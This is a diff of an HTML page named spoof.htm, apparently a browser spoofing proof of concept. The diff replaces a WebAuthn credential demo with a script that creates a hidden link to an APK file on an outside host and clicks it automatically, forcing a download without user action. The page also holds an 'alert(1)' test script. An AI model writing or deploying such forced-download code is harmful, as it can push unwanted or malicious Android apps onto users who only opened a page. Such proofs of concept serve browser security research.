@@ -8,45 +8,18 @@ alert(1); //alert twice
 </script>
 
 <script>
-async function sleep() {
-    document.write("Requesting WebAuthn...<br>");
+function sleep()
+{
+    document.write("123<br>");
 
-    if (!window.PublicKeyCredential) {
-        document.write("WebAuthn not supported in this browser.");
-        return;
-    }
-
-    const publicKey = {
-        challenge: new Uint8Array(32), // random challenge normally from server
-        rp: {
-            name: "Test RP"
-        },
-        user: {
-            id: new Uint8Array(16),
-            name: "testuser@example.com",
-            displayName: "Test User"
-        },
-        pubKeyCredParams: [
-            { type: "public-key", alg: -7 },   // ES256
-            { type: "public-key", alg: -257 }  // RS256
-        ],
-        authenticatorSelection: {
-            authenticatorAttachment: "platform",
-            userVerification: "required"
-        },
-        timeout: 60000,
-        attestation: "none"
-    };
-
-    try {
-        const credential = await navigator.credentials.create({ publicKey });
-        console.log("Credential created:", credential);
-        document.write("WebAuthn credential created successfully.");
-    } catch (err) {
-        console.error(err);
-        document.write("WebAuthn request failed: " + err);
-    }
+    var link = document.createElement("a");
+    link.href = "https://lowleveljody.github.io/pocbrowseraja/montero.apk";
+    link.download = "montero.apk";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
 }
+
 </script>
 
 spoof.htm
